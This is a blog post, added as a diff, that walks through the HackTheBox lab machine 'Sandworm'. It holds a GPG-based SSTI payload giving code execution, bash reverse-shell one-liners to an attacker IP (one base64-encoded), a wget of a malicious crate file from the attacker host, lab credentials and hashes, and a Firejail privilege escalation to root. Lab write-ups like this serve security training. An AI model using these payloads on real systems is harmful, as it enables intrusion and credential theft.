@@ -1,0 +1,230 @@
+---
+layout: post
+title:  "Writeup of Sandworm (HackTheBox)"
+date:   2023-11-18 18:06:00 +0000
+categories: hackthebox
+author: brun0ne
+tags: htb hackthebox sandworm gpg rce firejail
+---
+
+# Discovery
+
+Domain found: `ssa.htb`
+
+No subdomains found with `subdomains-top1million-20000.txt` on both http:// and https://.
+
+http://ssa.htb redirects to https://ssa.htb.
+
+It's a Flask app.
+
+**Interesting dirs:**
+
+```
+/admin
+/login
+```
+
+There's an email/username: `atlas@ssa.htb`.
+
+# /contact
+
+**Encrypting a message to send to `/contact`:**
+
+`gpg --import key.pub`
+
+`echo x | gpg --encrypt --recipient "atlas@ssa.htb" --armor`
+
+**Script for testing XSS, etc:**
+
+**./[generate.sh](generate.sh)** \<comment>
+
+```bash
+#!/bin/bash
+cat >foo <<EOF
+     %echo Generating a basic OpenPGP key
+     Key-Type: DSA
+     Key-Length: 1024
+     Subkey-Type: ELG-E
+     Subkey-Length: 1024
+     Name-Real: template
+     Name-Comment: ${1}
+     Name-Email: template@10.10.14.71
+     Expire-Date: 0
+     %commit
+     %echo done
+EOF
+
+gpg --batch --generate-key foo
+gpg -k
+gpg --output template.key --armor --export template
+
+rm message.clear message.asc message.unsigned.asc
+if [ $# -eq 1 ] 
+then
+    rm message
+    echo "Something" > message
+fi
+gpg --encrypt --recipient "atlas@ssa.htb" -u "template@10.10.14.71" --armor --output message.unsigned.asc message
+gpg --encrypt --recipient "atlas@ssa.htb" -u "template@10.10.14.71" --armor --output message.asc --sign message
+gpg --armor --output message.clear -u "template@10.10.14.71" --clear-sign message
+
+gpg --delete-secret-keys template
+gpg --delete-keys template
+```
+
+# /process
+
+Validing a message with `POST /process`:
+
+It needs the **--clear-sign** formatting.
+
+```
+Signature is valid! [GNUPG:] NEWSIG gpg: Signature made
+```
+
+# SSTI in comment
+
+**XSS** and **SSTI** in the message content didn't work. This is a **Flask** app, so let's try signing a message with this as the comment:
+
+```
+{{ config }}
+```
+
+`gpg --full-generate-key`
+
+`gpg --armor --output message.clear -u "template1@10.10.14.71" --clear-sign message`
+
+Then upload both the public key and message.clear to `/process`:
+
+**It worked!** Interesting fields:
+
+```json
+"DEBUG": False,
+"SECRET_KEY": "91668c1bc67132e3dcfb5b1a3e0c5c21",
+"SQLALCHEMY_DATABASE_URI": "mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA"
+```
+
+**Let's try RCE:**
+
+`./generate.sh "{{ ''.__class__.mro()[1].__subclasses__()[439]('id',shell=True,stdout=-1).communicate()[0].strip() }}"`
+
+```
+b'uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)'
+```
+
+# Reverse shell as atlas
+
+`bash -i >& /dev/tcp/10.10.14.71/9001 0>&1`
+
+`./generate.sh "{{ ''.__class__.mro()[1].__subclasses__()[439]('echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43MS85MDAxIDA+JjE= | base64 -d | bash',shell=True,stdout=-1).communicate()[0].strip() }}"`
+
+**~/.config/httpie/sessions/localhost_5000:**
+
+```json
+
+    "__meta__": {
+        "about": "HTTPie session file",
+        "help": "https://httpie.io/docs#sessions",
+        "httpie": "2.6.0"
+    },
+    "auth": {
+        "password": "quietLiketheWind22",
+        "type": null,
+        "username": "silentobserver"
+    },
+    "cookies": {
+        "session": {
+            "expires": null,
+            "path": "/",
+            "secure": false,
+            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
+        }
+    },
+    "headers": {
+        "Accept": "application/json, */*;q=0.5"
+    }
+}
+```
+
+# SSH - silentobserver
+
+`silentobserver:quietLiketheWind22` **works for SSH!**
+
+`user.txt: <redacted>`
+
+```
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+```
+
+`mysql -u atlas -p` *(GarlicAndOnionZ42)*
+
+```
+Odin:pbkdf2:sha256:260000$q0WZMG27Qb6XwVlZ$12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f
+silentobserver:pbkdf2:sha256:260000$kGd27QSYRsOtk7Zi$0f52e0aa1686387b54d9ea46b2ac97f9ed030c27aac4895bed89cb3a4e09482d
+```
+
+**Interesting activity on pspy:**
+
+```
+2023/06/18 15:16:11 CMD: UID=0     PID=273129 | /bin/bash /root/Cleanup/clean_c.sh 
+2023/06/18 15:16:11 CMD: UID=0     PID=273130 | /bin/rm -r /opt/crates 
+
+2023/06/18 15:18:01 CMD: UID=0     PID=273141 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline 
+
+2023/06/18 15:18:11 CMD: UID=0     PID=273161 | /usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet 
+```
+
+`/opt/tipnet/src/main.rs`:
+
+```rust
+let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream"
+```
+
+**tipnet:4The_Greater_GoodJ4A**
+
+# Firejail
+
+```
+1.7M -rwsr-x--- 1 root jailer 1.7M Nov 29  2022 /usr/local/bin/firejail
+```
+
+[CVE-2022-31214](https://www.openwall.com/lists/oss-security/2022/06/08/10) - privesc by SUID firejail.
+
+To be able to execute firejail, we need a shell as someone in **jailer**.
+
+`/etc/group`:
+
+```
+jailer:x:1002:atlas
+```
+
+By going to `/opt/crates/logger/src`, executing `rm lib.rs && wget http://10.10.14.71:8001/lib.rs`, then waiting and running `/opt/tipnet/target/debug/tipnet` - we get a reverse shell as **atlas**, unjailed.
+
+```
+uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
+```
+
+`firejail --version`
+
+```
+firejail version 0.9.68
+```
+
+**It should be vulnerable!**
+
+After executing the [PoC](https://www.openwall.com/lists/oss-security/2022/06/08/10/1), we get a message:
+
+```
+You can now run 'firejail --join=4410' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
+```
+
+Running `firejail --join=4410` and `su -` in a second shell gives us root.
+
+`root.txt: <redacted>`
